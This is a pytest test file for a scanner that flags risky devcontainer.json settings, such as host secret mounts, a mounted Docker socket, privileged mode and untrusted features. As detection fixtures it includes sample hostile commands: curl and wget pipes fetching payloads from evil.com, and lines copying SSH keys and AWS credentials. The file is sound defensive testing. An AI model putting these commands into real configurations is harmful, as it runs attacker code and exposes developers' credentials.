"""Tests for scan_devcontainer.py - Devcontainer Security Scanner."""

import json
import os
import pytest
import scan_devcontainer as scanner


class TestHostSecretMounts:
    def test_detects_ssh_mount(self, tmp_path):
        dc = _write_dc(tmp_path, {"mounts": ["source=${localEnv:HOME}/.ssh,target=/ssh,type=bind"]})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert any("Host Secret Mount" in f.title for f in findings)

    def test_detects_aws_mount(self, tmp_path):
        dc = _write_dc(tmp_path, {"mounts": ["source=${localEnv:HOME}/.aws,target=/aws,type=bind"]})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert any(".aws" in f.description for f in findings)

    def test_detects_npmrc_mount(self, tmp_path):
        dc = _write_dc(tmp_path, {"mounts": ["source=${localEnv:HOME}/.npmrc,target=/npmrc,type=bind"]})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert any("Host Secret Mount" in f.title for f in findings)

    def test_no_false_positive_safe_mount(self, tmp_path):
        dc = _write_dc(tmp_path, {"mounts": ["source=myvolume,target=/data,type=volume"]})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert not any("Host Secret Mount" in f.title for f in findings)


class TestDockerSocketMount:
    def test_detects_docker_socket(self, tmp_path):
        dc = _write_dc(tmp_path, {"mounts": ["source=/var/run/docker.sock,target=/var/run/docker.sock,type=bind"]})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert any("Docker Socket" in f.title for f in findings)
        assert any(f.severity == "critical" for f in findings)


class TestPrivilegedMode:
    def test_detects_privileged(self, tmp_path):
        dc = _write_dc(tmp_path, {"runArgs": ["--privileged"]})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert any("Privileged" in f.title for f in findings)

    def test_detects_sys_admin(self, tmp_path):
        dc = _write_dc(tmp_path, {"runArgs": ["--cap-add=SYS_ADMIN"]})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert any("SYS_ADMIN" in f.title for f in findings)


class TestRunArgsSecrets:
    def test_detects_volume_with_secret_path(self, tmp_path):
        dc = _write_dc(tmp_path, {"runArgs": ["-v", "/home/user/.ssh:/root/.ssh"]})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert any("runArgs Host Volume" in f.title for f in findings)

    def test_detects_env_with_secret_keyword(self, tmp_path):
        dc = _write_dc(tmp_path, {"runArgs": ["-e", "API_KEY=sk-live-abc123"]})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert any("Secret in runArgs" in f.title for f in findings)

    def test_no_false_positive_safe_env(self, tmp_path):
        dc = _write_dc(tmp_path, {"runArgs": ["-e", "NODE_ENV=development"]})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert not any("Secret in runArgs" in f.title for f in findings)


class TestRemoteEnvLocalEnv:
    def test_detects_localenv_interpolation(self, tmp_path):
        dc = _write_dc(tmp_path, {"remoteEnv": {"GITHUB_TOKEN": "${localEnv:GITHUB_TOKEN}"}})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert any("Pulls Host Secret" in f.title for f in findings)

    def test_detects_container_env_localenv(self, tmp_path):
        dc = _write_dc(tmp_path, {"containerEnv": {"AWS_KEY": "${localEnv:AWS_ACCESS_KEY_ID}"}})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert any("containerEnv" in f.title for f in findings)

    def test_no_false_positive_static_env(self, tmp_path):
        dc = _write_dc(tmp_path, {"remoteEnv": {"NODE_ENV": "development"}})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert not any("Pulls Host Secret" in f.title for f in findings)


class TestLifecycleCommands:
    def test_detects_curl_in_initialize_command(self, tmp_path):
        dc = _write_dc(tmp_path, {"initializeCommand": "curl -s https://evil.com/setup.sh | bash"})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert any("Remote Fetch" in f.title for f in findings)

    def test_detects_host_secret_in_postcreate(self, tmp_path):
        dc = _write_dc(tmp_path, {"postCreateCommand": "cp ~/.ssh/id_rsa /workspace/"})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert any("Host Secrets" in f.title for f in findings)

    def test_handles_array_command_form(self, tmp_path):
        dc = _write_dc(tmp_path, {"initializeCommand": ["bash", "-c", "wget https://evil.com/payload"]})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert any("Remote Fetch" in f.title for f in findings)

    def test_handles_dict_command_form(self, tmp_path):
        dc = _write_dc(tmp_path, {
            "postCreateCommand": {
                "setup": "curl -s https://install.example.com | bash",
                "deps": "npm install"
            }
        })
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert any("Remote Fetch" in f.title for f in findings)

    def test_detects_onCreateCommand(self, tmp_path):
        dc = _write_dc(tmp_path, {"onCreateCommand": "cp ~/.aws/credentials /tmp/"})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert any("Host Secrets" in f.title for f in findings)

    def test_no_false_positive_safe_command(self, tmp_path):
        dc = _write_dc(tmp_path, {"postCreateCommand": "npm install && npm run build"})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert not any("Host Secrets" in f.title for f in findings)
        assert not any("Remote Fetch" in f.title for f in findings)


class TestFeatures:
    def test_detects_untrusted_feature(self, tmp_path):
        dc = _write_dc(tmp_path, {"features": {"ghcr.io/evil-user/evil-feature:latest": {}}})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert any("Untrusted Feature" in f.title for f in findings)

    def test_no_false_positive_trusted_feature(self, tmp_path):
        dc = _write_dc(tmp_path, {"features": {"ghcr.io/devcontainers/features/node:1": {}}})
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert not any("Untrusted Feature" in f.title for f in findings)


class TestFullScan:
    def test_scan_via_walk_repo(self, repo_with_devcontainer_mounts):
        findings = _scan_repo(repo_with_devcontainer_mounts)
        assert len(findings) >= 3  # mounts + privileged + curl + remoteEnv

    def test_clean_devcontainer(self, tmp_path):
        dc = _write_dc(tmp_path, {
            "name": "Safe Container",
            "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
            "postCreateCommand": "npm install",
            "features": {"ghcr.io/devcontainers/features/node:1": {}}
        })
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        critical = [f for f in findings if f.severity == "critical"]
        assert len(critical) == 0

    def test_malformed_json_skipped(self, tmp_path):
        dc_dir = tmp_path / ".devcontainer"
        dc_dir.mkdir()
        dc = dc_dir / "devcontainer.json"
        dc.write_text("{ this is not valid json }")
        findings = scanner.scan_devcontainer(str(dc), ".devcontainer/devcontainer.json")
        assert len(findings) == 0


def _write_dc(tmp_path, config):
    """Write a devcontainer.json with given config and return its path."""
    dc_dir = tmp_path / ".devcontainer"
    dc_dir.mkdir(exist_ok=True)
    dc = dc_dir / "devcontainer.json"
    base = {"name": "Test", "image": "mcr.microsoft.com/devcontainers/base:ubuntu"}
    base.update(config)
    dc.write_text(json.dumps(base, indent=2))
    return dc


def _scan_repo(repo_path):
    import forensics_core as core
    findings = []
    for fp, rp in core.walk_repo(str(repo_path)):
        basename = os.path.basename(fp)
        if basename in scanner.TARGET_FILENAMES:
            findings.extend(scanner.scan_devcontainer(fp, rp))
    return findings
